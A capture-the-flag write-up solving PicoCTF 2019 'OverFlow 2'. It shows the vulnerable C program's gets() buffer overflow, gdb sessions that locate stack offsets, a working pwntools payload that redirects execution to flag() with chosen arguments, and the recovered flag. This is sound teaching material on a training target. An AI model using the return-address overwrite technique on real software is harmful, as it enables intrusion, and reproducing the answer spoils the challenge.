# PicoCTF19 OverFlow 2

## Challenge

Now try overwriting arguments. Can you get the flag from this [program](https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln)? You can find it in /problems/overflow-2 on the shell server. [Source](https://2019shell1.picoctf.com/static/2b7b3583b687134589781c4e22ef5760/vuln.c).

## Hints

GDB can print the stack after you send arguments

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/overflow-2$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 22:04 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-2_3    33 Sep 28 22:04 flag.txt
-rwxr-sr-x   1 hacksports overflow-2_3  7500 Sep 28 22:04 vuln
-rw-rw-r--   1 hacksports hacksports     794 Sep 28 22:04 vuln.c
```

Let's view `vuln.c`

```
samson@pico-2019-shell1:/problems/overflow-2$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

It seems like a program that takes in some input and prints it back to you. Let's try that and some large input.

```bash
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ ./vuln
Please enter your string: 
A
A
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ echo $(python -c "print 'A'*184") | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

We need to invoke the `flag()` function like `flag(0xDEADBEEF, 0xC0DED00D)` from `vuln()`

The hint suggests to look at the stack, so let's do that.

```bash
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) r
Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0804872a in main ()
(gdb) info frame
Stack level 0, frame at 0x1:
 eip = 0x804872a in main; saved eip = <not saved>
 Outermost frame: Cannot access memory at address 0xfffffffd
 Arglist at 0x41414141, args: 
 Locals at 0x41414141, Previous frame's sp is 0x1
Cannot access memory at address 0xfffffffd
```

Notice how the `Arglist` is at `0x41414141`. Those are the `A`'s we passed in. So let's try a different string and see if we can figure out where in the list to enter our address and arguments.

Let's try 176 `A`'s followed by the rest of the alphabet to see what ends up at the arg list.

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`

```bash
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) r
Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) bt
#0  0x45454545 in ?? ()
#1  0x46464646 in ?? ()
#2  0x47474747 in ?? ()
#3  0x48484848 in ?? ()
#4  0x49494949 in ?? ()
#5  0x4a4a4a4a in ?? ()
#6  0x4b4b4b4b in ?? ()
#7  0x4c4c4c4c in ?? ()
#8  0x4d4d4d4d in ?? ()
#9  0x4e4e4e4e in ?? ()
#10 0x4f4f4f4f in ?? ()
#11 0x50505050 in ?? ()
#12 0x51515151 in ?? ()
#13 0x52525252 in ?? ()
#14 0x53535353 in ?? ()
#15 0x54545454 in ?? ()
#16 0x55555555 in ?? ()
#17 0x56565656 in ?? ()
#18 0x57575757 in ?? ()
#19 0x58585858 in ?? ()
#20 0x59595959 in ?? ()
#21 0x5a5a5a5a in ?? ()
#22 0x00000000 in ?? ()
(gdb) info frame
Stack level 0, frame at 0xffada8e4:
 eip = 0x45454545; saved eip = 0x46464646
 called by frame at 0xffada8e8
 Arglist at 0xffada8dc, args: 
 Locals at 0xffada8dc, Previous frame's sp is 0xffada8e4
 Saved registers:
  eip at 0xffada8e0
```

```bash
(gdb) disas flag
Dump of assembler code for function flag:
   0x080485e6 <+0>:     push   %ebp
... <redacted>
   0x0804864a <+100>:   cmpl   $0xdeadbeef,0x8(%ebp)
   0x08048651 <+107>:   jne    0x804866d <flag+135>
   0x08048653 <+109>:   cmpl   $0xc0ded00d,0xc(%ebp)
   0x0804865a <+116>:   jne    0x8048670 <flag+138>
... <redacted>
   0x08048675 <+143>:   ret    
End of assembler dump.
```

Intersting, we saw that it stopped at `0x45454545` which are the `DDDD`. So now we have 176 `A`'s, 12 bytes, `FLAG_ADDRESS`. So we could use:

```bash
python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)" | ./vuln
```

Now the arguments `arg1` and `arg2` won't be far past the `FLAG_ADDRESS`. Let's determine where it needs to go.

```bash
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'" > /tmp/in
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) r < /tmp/in
Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < /tmp/in
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2734491) exited normally]
```

The program doesn't work because gdb isn't running under the same permissions. I'll copy the files over to another directory and attempt it

```bash
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ mkdir /tmp/s5
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cp vuln /tmp/s5/vuln
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ vi /tmp/s5/flag.txt
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ cat /tmp/s5/flag.txt
SAMCTF{123123123123123}
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ pushd . && cd /tmp/s5
samson@pico-2019-shell1:/tmp/s5$ gdb ./vuln
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) b *flag
Breakpoint 1 at 0x80485e6
(gdb) b *flag+97
Breakpoint 2 at 0x8048647
(gdb) r < /tmp/in
Starting program: /tmp/s5/vuln < /tmp/in
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Breakpoint 1, 0x080485e6 in flag ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048647 in flag ()
(gdb) info stack
#0  0x08048647 in flag ()
#1  0x41414141 in ?? ()
#2  0x42424242 in ?? ()
#3  0x43434343 in ?? ()
#4  0x44444444 in ?? ()
#5  0x45454545 in ?? ()
#6  0x46464646 in ?? ()
#7  0x47474747 in ?? ()
#8  0x48484848 in ?? ()
#9  0xf7fbe000 in ?? () from /lib32/libc.so.6
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
(gdb) x $ebp
0xffffd5ac:     0x42424242
```

There it is. `ebp` is the first argument and from this [stackoverflow post](https://stackoverflow.com/questions/42771550/why-does-first-parameter-in-x86-assembly-starts-from-offset-8)
We know the arguments are just 4 places off the flag adddress.

```bash
samson@pico-2019-shell1:/tmp/s5$ popd
/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446
samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln 
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
```

## Flag

picoCTF{arg5_and_r3turn51b106031}